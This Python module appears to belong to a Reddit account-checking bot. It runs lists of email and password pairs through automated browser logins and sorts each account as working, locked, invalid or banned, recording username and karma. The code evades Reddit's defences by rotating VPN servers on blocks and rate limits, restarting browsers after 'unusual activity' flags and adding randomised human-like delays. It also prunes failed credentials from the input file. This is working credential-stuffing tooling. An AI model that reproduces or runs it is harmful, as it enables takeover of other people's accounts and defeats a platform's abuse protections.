"""
Sequential account processing - handles single-threaded processing with browser reuse.
"""
from typing import List, Dict, Tuple
import time
import random as _random

from playwright.sync_api import sync_playwright

from config import HUMANIZE_INPUT, INTER_ACCOUNT_DELAY_MIN_S, INTER_ACCOUNT_DELAY_MAX_S, REUSE_BROWSER_FOR_BATCH, VPN_ROTATE_AFTER_ACCOUNTS, PERSISTENT_CONTEXT, RESTART_BROWSER_ON_SUCCESS
from ip_utils import get_ip_info
from bot.browser.page_utils import get_or_create_page, close_extra_pages


def process_accounts_sequential(engine, credentials: List[Tuple[str, str]], file_path: str) -> List[Dict]:
    """
    Sequential processing - reuse the same browser/context for many accounts.

    Args:
        engine: RedditBotEngine instance
        credentials: List of (email, password) tuples
        file_path: Path to credential file (used for pruning)

    Returns:
        List of result dictionaries
    """
    results: List[Dict] = []

    browser_reuse_start = None
    accounts_with_current_browser = 0

    try:
        engine.log("🔧 [ENGINE] Initializing Playwright driver...")
        with sync_playwright() as playwright:
            engine.log("✅ [ENGINE] Playwright driver initialized")
            browser = None
            context = None
            page = None

            for i, (email, password) in enumerate(credentials, 1):
                if engine.should_stop:
                    engine.log("Bot stopped by user")
                    break
                
                # Initialize variables that might be referenced if IP fetching is skipped
                ip = ""
                country = ""
                location = ""
                
                # Check VPN status - if disconnected (and not rotating), stop the bot
                engine.log("🔧 [ENGINE] Pre-flight VPN check...")
                if not engine.check_vpn_status():
                    engine.log("🛑 [ENGINE] VPN check failed, aborting worker")
                    break
                engine.log("✅ [ENGINE] VPN check passed")

                # Launch browser if needed (or if we need to switch profiles for isolation)
                # Verify browser/context/page are still valid and NOT closed before reuse 
                # (or force recreate if PERSISTENT_CONTEXT is enabled for isolation)
                page_is_closed = True
                try:
                    if page and not page.is_closed():
                        page_is_closed = False
                except:
                    pass
                    
                if context is None or page is None or page_is_closed or PERSISTENT_CONTEXT:
                    try:
                        if context is not None:
                            engine.log(f"🔄 [ENGINE] Closing previous profile context to switch to {email}...")
                            engine._close_context_browser_sync(browser, context)
                            context = None
                            
                        self_profile_name = email if PERSISTENT_CONTEXT else None
                        engine.log(f"🎬 [ENGINE] Launching browser (Profile: {self_profile_name or 'Incognito'})...")
                        browser, context = engine._launch_browser_and_context_sync(playwright, profile_name=self_profile_name)
                        engine.log("✅ [ENGINE] Browser launch completed")
                        engine.log("✅ [ENGINE] Browser opened successfully")
                        page = get_or_create_page(context)
                        close_extra_pages(context, keep_first=True)
                        browser_reuse_start = time.time()
                        accounts_with_current_browser = 0
                    except Exception as e:
                        err_msg = str(e)
                        if "Executable doesn't exist" in err_msg or "executable_path" in err_msg:
                            engine.log("❌ [ENGINE] Playwright browser not found!")
                            engine.log("💡 [FIX] Please run this in your terminal: python3 -m playwright install chromium")
                            engine.browser_status = "Error: Browser Missing"
                        else:
                            engine.log(f"❌ [ENGINE] Browser launch error: {err_msg}")
                            engine.browser_status = "Error: Launch Failed"
                        
                        if i == 1: # If first attempt fails, return
                            return results
                        continue

                engine.log(f"[{i}/{len(credentials)}] Processing: {email}")
                if engine.vpn_manager and engine.current_vpn_location:
                    engine.log(f"⏳Start Checking {email} with ExpressVPN ({engine.current_vpn_location})...")

                engine.browser_status = f"Processing: {email}"
                result = engine.login_to_reddit(
                    email,
                    password,
                    playwright,
                    first_attempt=(i == 1),
                    reuse_context=context,
                    reuse_page=page,
                    profile_name=email if PERSISTENT_CONTEXT else None
                )

                if result.get("status") == "error" and result.get("error_message", "").lower().startswith("unable to determine"):
                    engine.log(f"🔄 Retrying {email} with fresh browser due to unclear error...")
                    engine.browser_status = f"Retrying: {email}"
                    if browser_reuse_start and accounts_with_current_browser > 0:
                        browser_reuse_duration = time.time() - browser_reuse_start
                        result.setdefault("timing", {})["browser_reuse_before_restart_seconds"] = round(browser_reuse_duration, 3)
                        result.setdefault("timing", {})["accounts_processed_before_restart"] = accounts_with_current_browser
                    engine._close_context_browser_sync(browser, context)
                    browser_reuse_start = time.time()
                    accounts_with_current_browser = 0
                    try:
                        browser, context = engine._launch_browser_and_context_sync(playwright)
                        page = get_or_create_page(context)
                        close_extra_pages(context, keep_first=True)
                        retry_result = engine.login_to_reddit(
                            email,
                            password,
                            playwright,
                            first_attempt=False,
                            reuse_context=context,
                            reuse_page=page,
                        )
                        if retry_result.get("status") != "error" or not retry_result.get("error_message", "").lower().startswith("unable to determine"):
                            result = retry_result
                            engine.log(f"✅ Retry successful - Status: {result.get('status')}")
                        else:
                            engine.log("⚠️  Retry still unclear, keeping original result")
                    except Exception as retry_err:
                        engine.log(f"⚠️  Retry failed: {str(retry_err)}")

                result["ip_address"] = ip if ip else ""
                result["country"] = country if country else ""
                result["location"] = location if location else ""

                if browser_reuse_start is not None:
                    result.setdefault("timing", {})["browser_reuse_seconds_so_far"] = round(time.time() - browser_reuse_start, 3)
                result.setdefault("timing", {})["accounts_with_current_browser"] = accounts_with_current_browser + 1

                results.append(result)

                accounts_with_current_browser += 1

                if engine.progress_callback:
                    try:
                        total = len(results)
                        success_count = sum(1 for r in results if (r.get("status") or "").lower() == "success")
                        locked_count = sum(1 for r in results if (r.get("status") or "").lower() == "locked")
                        invalid_count = sum(1 for r in results if (r.get("status") or "").lower() == "invalid")
                        banned_count = sum(1 for r in results if (r.get("status") or "").lower() == "banned")
                        error_count = sum(1 for r in results if (r.get("status") or "").lower() == "error")
                        engine.progress_callback(
                            {
                                "total": total,
                                "success": success_count,
                                "locked": locked_count,
                                "invalid": invalid_count,
                                "banned": banned_count,
                                "error": error_count,
                            }
                        )
                    except:
                        pass

                status = result["status"].lower()
                is_failure = status in ["banned", "error"]
                err_lower = (result.get("error_message", "") or "").lower()
                is_blocked = ("blocked" in err_lower) or ("detect" in err_lower) or ("server error" in err_lower)
                is_rate_limit = ("rate limit" in err_lower) or ("too many" in err_lower) or ("try again" in err_lower)
                is_something_wrong = ("something went wrong logging in" in err_lower) or ("went wrong" in err_lower)
                is_error_occurred = (
                    ("an error occurred" in err_lower)
                    or ("disable any extensions" in err_lower)
                    or ("try using a different web browser" in err_lower)
                )
                is_locked_reset = (
                    ('reset' in err_lower and 'password' in err_lower)
                    or ('locked' in err_lower)
                    or ('unusual activity' in err_lower)
                )

                if (is_something_wrong or is_error_occurred or status == "security_block"):
                    error_type = "security block" if status == "security_block" else ("an error occurred" if is_error_occurred else "something went wrong")
                    max_retries = 3
                    retry_successful = False

                    for retry_attempt in range(1, max_retries + 1):
                        if retry_successful or engine.should_stop:
                            break

                        engine.log(f"🔄 Retry attempt {retry_attempt}/{max_retries} for {email} due to '{error_type}' error...")
                        
                        # Show retry status in the UI/Inventory list
                        try:
                            engine.db.log_account_result(
                                engine.session_id, 
                                email, 
                                "retrying", 
                                password=password, 
                                error_message=f"Retry {retry_attempt}/{max_retries}: {error_type}"
                            )
                        except:
                            pass

                        if retry_attempt > 1 and engine.vpn_manager:
                            engine.log(f"🌐 Changing VPN for retry attempt {retry_attempt}...")
                            try:
                                engine._close_context_browser_sync(browser, context)
                                engine._run_async(engine.vpn_manager.disconnect())
                                time.sleep(0.5)
                                from config import (
                                    VPN_PREFERRED_COUNTRIES,
                                    VPN_AVOID_COUNTRIES,
                                    VPN_LOCATION_COOLDOWN_SECONDS,
                                    VPN_LOCATION_MAX_TRIES_PER_ROTATION,
                                )
                            except Exception:
                                VPN_PREFERRED_COUNTRIES, VPN_AVOID_COUNTRIES = [], []
                                VPN_LOCATION_COOLDOWN_SECONDS = 900
                                VPN_LOCATION_MAX_TRIES_PER_ROTATION = 10

                            success, msg = engine._run_async(engine.vpn_manager.connect_with_strategy(
                                preferred=VPN_PREFERRED_COUNTRIES,
                                avoid=VPN_AVOID_COUNTRIES,
                                cooldown_seconds=int(VPN_LOCATION_COOLDOWN_SECONDS),
                                max_candidates=int(VPN_LOCATION_MAX_TRIES_PER_ROTATION),
                            ))
                            if success:
                                time.sleep(2)
                                is_connected, vpn_location = engine._run_async(engine.vpn_manager.get_status())
                                if is_connected:
                                    engine.current_vpn_location = vpn_location
                                    engine.log(f"✅ Connected to VPN: {vpn_location} for retry")
                                    time.sleep(2)

                        engine._close_context_browser_sync(browser, context)

                        try:
                            browser, context = engine._launch_browser_and_context_sync(playwright)
                            page = get_or_create_page(context)
                            close_extra_pages(context, keep_first=True)

                            if engine.should_stop:
                                break

                            retry_result = engine.login_to_reddit(
                                email,
                                password,
                                playwright,
                                first_attempt=False,
                                reuse_context=context,
                                reuse_page=page,
                            )

                            if retry_result.get("status") in ["success", "invalid", "banned", "locked"]:
                                result = retry_result
                                result["ip_address"] = ip if ip else ""
                                result["country"] = country if country else ""
                                result["location"] = location if location else ""
                                engine.log(f"✅ Retry {retry_attempt} successful - Status: {result.get('status')}")
                                status = result.get("status", "").lower()
                                err_lower = (result.get("error_message", "") or "").lower()
                                is_something_wrong = False
                                is_error_occurred = False
                                retry_successful = True
                                break
                            else:
                                if retry_attempt < max_retries:
                                    engine.log("⚠️  Retry still shows error, trying again...")
                                else:
                                    engine.log(f"⚠️  All {max_retries} retries failed: {retry_result.get('error_message', 'Unknown')}")
                        except Exception as retry_err:
                            engine.log(f"⚠️  Retry {retry_attempt} failed: {str(retry_err)}")
                            if retry_attempt < max_retries:
                                time.sleep(1)

                if engine.should_stop:
                    break

                if status == "success":
                    engine.consecutive_failures = 0
                elif is_failure:
                    engine.consecutive_failures += 1

                # Account-based VPN rotation trigger
                # Only count successful or session-risk attempts, not invalid credentials
                if status != "invalid":
                    accounts_with_current_browser += 1

                should_change_vpn = (
                    is_blocked
                    or is_rate_limit
                    or (is_something_wrong and engine.consecutive_failures >= 3)
                    or (engine.consecutive_failures >= engine.max_failures_before_vpn_change)
                    or (VPN_ROTATE_AFTER_ACCOUNTS > 0 and accounts_with_current_browser >= VPN_ROTATE_AFTER_ACCOUNTS)
                ) and status != "invalid" and not engine.should_stop

                if should_change_vpn and engine.vpn_manager:
                    reason = "blocked/rate-limit" if (is_blocked or is_rate_limit) else f"failures>={engine.max_failures_before_vpn_change}"
                    engine.last_vpn_reason = reason
                    engine.vpn_rotations += 1
                    engine.log(f"🔄 Changing VPN ({reason}). Rotations: {engine.vpn_rotations}")
                    if browser_reuse_start and accounts_with_current_browser > 0:
                        result.setdefault("timing", {})["browser_reuse_before_vpn_rotation_seconds"] = round(time.time() - browser_reuse_start, 3)
                        result.setdefault("timing", {})["accounts_before_vpn_rotation"] = accounts_with_current_browser
                    engine._close_context_browser_sync(browser, context)
                    browser_reuse_start = time.time()
                    accounts_with_current_browser = 0
                    engine.log("🚫 Disconnecting current ExpressVPN connection...")
                    engine._run_async(engine.vpn_manager.disconnect())
                    time.sleep(0.5)
                    engine.log("✅ Disconnected ExpressVPN")

                    engine.log("🌐 Connecting to new ExpressVPN server...")
                    try:
                        from config import (
                            VPN_PREFERRED_COUNTRIES,
                            VPN_AVOID_COUNTRIES,
                            VPN_LOCATION_COOLDOWN_SECONDS,
                            VPN_LOCATION_MAX_TRIES_PER_ROTATION,
                        )
                    except Exception:
                        VPN_PREFERRED_COUNTRIES, VPN_AVOID_COUNTRIES = [], []
                        VPN_LOCATION_COOLDOWN_SECONDS = 900
                        VPN_LOCATION_MAX_TRIES_PER_ROTATION = 10
                    success, msg = engine._run_async(engine.vpn_manager.connect_with_strategy(
                        preferred=VPN_PREFERRED_COUNTRIES,
                        avoid=VPN_AVOID_COUNTRIES,
                        cooldown_seconds=int(VPN_LOCATION_COOLDOWN_SECONDS),
                        max_candidates=int(VPN_LOCATION_MAX_TRIES_PER_ROTATION),
                    ))
                    if success:
                        time.sleep(2)
                        is_connected, vpn_location = engine._run_async(engine.vpn_manager.get_status())
                        if is_connected:
                            engine.current_vpn_location = vpn_location
                            engine.log(f"✅ Connected to new server: {vpn_location}")
                            engine.log("⏳ Please wait for server location to stabilize...")
                            time.sleep(2)
                            engine.consecutive_failures = 0
                            engine._close_context_browser_sync(browser, context)
                            try:
                                browser, context = engine._launch_browser_and_context_sync(playwright)
                                page = get_or_create_page(context)
                                close_extra_pages(context, keep_first=True)
                            except Exception as relaunch_err:
                                engine.log(f"Browser relaunch error: {str(relaunch_err)}")
                                if engine.progress_callback:
                                    try:
                                        engine.progress_callback(
                                            {
                                                "vpn_rotations": engine.vpn_rotations,
                                                "last_vpn_reason": engine.last_vpn_reason,
                                            }
                                        )
                                    except Exception:
                                        pass
                                return results

                # Only restart for session-risk OR if explicit restart-on-success is enabled
                should_restart_session = (is_locked_reset or is_blocked or is_rate_limit or status in ["banned", "error"])
                if status == "success" and RESTART_BROWSER_ON_SUCCESS:
                    should_restart_session = True
                
                if should_restart_session and status != "invalid" and not engine.should_stop:
                    try:
                        engine.log("🔁 Restarting browser due to session-risk issue...")
                        if browser_reuse_start and accounts_with_current_browser > 0:
                            result.setdefault("timing", {})["browser_reuse_before_lock_restart_seconds"] = round(time.time() - browser_reuse_start, 3)
                            result.setdefault("timing", {})["accounts_before_lock_restart"] = accounts_with_current_browser
                        engine._close_context_browser_sync(browser, context)
                        browser_reuse_start = time.time()
                        accounts_with_current_browser = 0
                        browser, context = engine._launch_browser_and_context_sync(playwright)
                        try:
                            pages = getattr(context, "pages", [])
                            page = pages[0] if pages else context.new_page()
                        except Exception:
                            page = context.new_page()
                    except Exception as re_err:
                        engine.log(f"Browser restart error: {str(re_err)}")
                        return results

                if engine.should_stop:
                    break

                # Fetch current IP info if VPN is on
                if engine.vpn_manager and engine.vpn_connected_at_start:
                    try:
                        ip, country, _ = get_ip_info()
                    except:
                        ip, country = "Unknown", "Unknown"

                engine.db.log_account_result(
                    engine.session_id,
                    email,
                    result["status"],
                    result.get("password"),
                    result.get("username"),
                    result.get("karma"),
                    result.get("error_message"),
                    vpn_location=engine.current_vpn_location,
                    vpn_ip=ip if 'ip' in locals() else None
                )
                
                if engine.result_callback:
                    try:
                        engine.result_callback(result)
                    except Exception:
                        pass

                if result["status"].lower() == "success":
                    engine.log(f"✅ Login successful: {email}")
                elif result["status"].lower() == "locked":
                    engine.log(
                        f"⚠️  Account locked (password reset required): {email} | Username: {result.get('username')} | Karma: {result.get('karma')}"
                    )
                elif result["status"].lower() == "invalid":
                    timing_info = result.get("timing", {})
                    cred_time = timing_info.get("credential_input_seconds", "N/A")
                    total_time = timing_info.get("total_account_seconds", "N/A")
                    engine.log(f"❌ Wrong password: {email} | CredInput: {cred_time}s | Total: {total_time}s")
                elif result["status"].lower() == "banned":
                    engine.log(f"❌❌❌ Banned: {email}")
                elif is_blocked:
                    engine.log(f"❌Check failed>>>Reddit detect & Blocked❌: {email}")
                else:
                    if 'reset' in err_lower and 'password' in err_lower:
                        engine.log(f"⚠️  Account locked (password reset required): {email}")
                    elif 'locked' in err_lower:
                        engine.log(f"⚠️  Account locked due to unusual activity: {email}")
                    else:
                        engine.log(f"❌ Failed to login (Unclear reason): {email}")

                try:
                    from config import FILE_PRUNING_ENABLED, FILE_PRUNING_REMOVE_ON
                except Exception:
                    FILE_PRUNING_ENABLED = False
                    FILE_PRUNING_REMOVE_ON = ["invalid", "banned"]
                if FILE_PRUNING_ENABLED and result["status"].lower() in [s.lower() for s in FILE_PRUNING_REMOVE_ON]:
                    engine._prune_credentials_entry(file_path, email, password)

                if i < len(credentials) and not engine.should_stop:
                    if not REUSE_BROWSER_FOR_BATCH:
                        engine.log("🔁 Closing browser to prepare for a fresh instance...")
                        engine._close_context_browser_sync(browser, context)
                        browser, context, page = None, None, None
                        browser_reuse_start = time.time()
                        accounts_with_current_browser = 0
                    
                    if HUMANIZE_INPUT:
                        try:
                            delay = _random.uniform(INTER_ACCOUNT_DELAY_MIN_S, INTER_ACCOUNT_DELAY_MAX_S)
                            time.sleep(delay)
                        except Exception:
                            pass

                try:
                    err_lower = (result.get("error_message", "") or "").lower()
                    current_status = (result.get("status") or "").lower()
                    is_lock_reset = ('reset' in err_lower and 'password' in err_lower) or ('locked' in err_lower) or ('unusual activity' in err_lower)
                    if is_lock_reset and current_status != "invalid" and not engine.should_stop:
                        engine.log("🔁 Detected account lock/reset banner. Restarting browser for a clean state...")
                        if browser_reuse_start and accounts_with_current_browser > 0:
                            result.setdefault("timing", {})["browser_reuse_before_detected_lock_seconds"] = round(time.time() - browser_reuse_start, 3)
                            result.setdefault("timing", {})["accounts_before_detected_lock"] = accounts_with_current_browser
                        engine._close_context_browser_sync(browser, context)
                        browser_reuse_start = time.time()
                        accounts_with_current_browser = 0
                        try:
                            if engine.should_stop:
                                return results
                            browser, context = engine._launch_browser_and_context_sync(playwright)
                            page = context.new_page()
                            try:
                                pages = getattr(context, "pages", [])
                                for p in pages:
                                    if p != page:
                                        try:
                                            p.close()
                                        except:
                                            pass
                            except:
                                pass
                            engine.log("✅ Fresh browser started")
                        except Exception as relaunch_err:
                            engine.log(f"Browser relaunch error after lock/reset: {str(relaunch_err)}")
                            return results
                except Exception:
                    pass

    except KeyboardInterrupt:
        engine.log("\n⚠️  Keyboard interrupt (Ctrl+C) detected. Stopping bot and disconnecting VPN...")
        engine.should_stop = True
        if engine.vpn_manager:
            try:
                engine._run_async(engine.vpn_manager.disconnect())
            except:
                pass
        return results
    except Exception as e:
        engine.log(f"⚠️  Unexpected error in processing: {str(e)}")
        if engine.vpn_manager:
            try:
                engine._run_async(engine.vpn_manager.disconnect())
            except:
                pass
        return results

    return results

